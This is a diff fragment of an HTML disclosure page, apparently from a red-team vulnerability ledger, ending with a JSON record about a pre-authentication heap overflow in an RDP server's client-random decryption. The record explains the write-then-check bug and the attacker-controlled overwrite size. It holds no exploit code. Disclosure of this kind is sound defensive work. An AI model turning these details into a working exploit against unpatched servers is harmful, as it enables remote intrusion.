+  &#34;technical_details&#34;: &#34;The root cause is a write-then-check ordering bug: BN_bn2bin(y, output) unconditionally writes BN_num_bytes(y) bytes into the output buffer, and the comparison against out_length at line 109 happens only after the write has already occurred. Since rdp_update_client_random() allocates ClientRandom as a fixed calloc(32,1) buffer while the decrypted value can be as large as the RSA modulus (64 bytes for the built-in tssk key, 256 for RSA-2048), an attacker who controls the ciphertext controls both the length and content of a 32–224 byte heap overwrite.&#34;,
+  &#34;title&#34;: &#34;Pre-auth server heap overflow decrypting client random&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
